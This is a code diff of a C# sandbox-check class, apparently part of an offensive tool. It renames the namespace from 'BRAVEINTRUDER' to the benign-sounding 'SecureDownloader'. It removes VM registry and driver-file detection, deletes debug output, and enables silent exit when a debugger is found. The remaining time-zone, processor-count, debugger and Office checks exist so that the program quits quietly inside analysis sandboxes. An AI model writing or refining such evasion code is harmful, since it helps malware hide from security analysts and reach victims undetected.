@@ -13,8 +13,7 @@ using System.Management.Automation.Runspaces;
 using System.Diagnostics;
 using System.Text.RegularExpressions;
 
-namespace BRAVEINTRUDER
-{
+namespace SecureDownloader {
     class SandboxCheck
     {
         private static bool checkTimeZone()
@@ -27,82 +26,6 @@ namespace BRAVEINTRUDER
             {
                 return true;
             }
-        }
-
-        private static bool checkVMRegistryKeys()
-        {
-            List<string> EvidenceOfSandbox = new List<string>();
-
-            List<string> sandboxStrings = new List<string> { "vmware", "virtualbox", "vbox", "qemu", "xen" };
-
-            string[] HKLM_Keys_To_Check_Exist = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
-                @"SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
-                @"SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev",
-                @"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
-                @"SOFTWARE\VMWare, Inc.\VMWare Tools",
-                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
-                @"HARDWARE\ACPI\DSDT\VBOX_"};
-
-            string[] HKLM_Keys_With_Values_To_Parse = {@"SYSTEM\ControlSet001\Services\Disk\Enum\0",
-                @"HARDWARE\Description\System\SystemBiosInformation",
-                @"HARDWARE\Description\System\VideoBiosVersion",
-                @"HARDWARE\Description\System\SystemManufacturer",
-                @"HARDWARE\Description\System\SystemProductName",
-                @"HARDWARE\Description\System\Logical Unit Id 0"};
-
-            foreach (string HKLM_Key in HKLM_Keys_To_Check_Exist)
-            {
-                RegistryKey OpenedKey = Registry.LocalMachine.OpenSubKey(HKLM_Key, false);
-                if (OpenedKey != null)
-                {
-                    EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key);
-                }
-            }
-
-            foreach (string HKLM_Key in HKLM_Keys_With_Values_To_Parse)
-            {
-                string valueName = new DirectoryInfo(HKLM_Key).Name;
-                string value = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(HKLM_Key), false).GetValue(valueName);
-                foreach (string sandboxString in sandboxStrings)
-                {
-                    if (!string.IsNullOrEmpty(value) && value.ToLower().Contains(sandboxString.ToLower()))
-                    {
-                        EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key + " => " + value);
-                    }
-                }
-            }
-            return EvidenceOfSandbox.Count == 0;
-        }
-
-        private static bool checkVMFilePaths()
-        {
-            List<string> EvidenceOfSandbox = new List<string>();
-            string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
-        @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
-        @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
-        @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
-        @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
-        @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
-        @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
-        @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
-        @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
-        @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
-        @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
-        @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
-        @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
-        @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
-        @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
-        @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
-        @"C:\windows\Sysnative\VBoxControl.exe"};
-            foreach (string FilePath in FilePaths)
-            {
-                if (File.Exists(FilePath))
-                {
-                    EvidenceOfSandbox.Add(FilePath);
-                }
-            }
-
-            return EvidenceOfSandbox.Count == 0;
         }
 
         private static bool checkProcessorCount()
@@ -149,43 +72,25 @@ namespace BRAVEINTRUDER
         {
             if (!checkTimeZone())
             {
-                Console.WriteLine("time zone");
                 Environment.Exit(0);
             }
 
             if (!checkProcessorCount())
             {
-                Console.WriteLine("processor");
                 Environment.Exit(0);
             }
 
             if (checkDebugger())
             {
-                Console.WriteLine("debugger");
-                //Environment.Exit(0);
+                Environment.Exit(0);
             }
 
             if (!checkOfficeInstall())
             {
-                Console.WriteLine("office");
                 Environment.Exit(0);
             }
 
-            if (!checkVMFilePaths())
-            {
-                Console.WriteLine("vm file paths");
-                Environment.Exit(0);
-            }
-
-            return;
-
-            //Bug here
-            if (!checkVMRegistryKeys())
-            {
-                Console.WriteLine("vm registry keys");
-                Environment.Exit(0);
-            }
-            
+            return;            
         }
     }
 
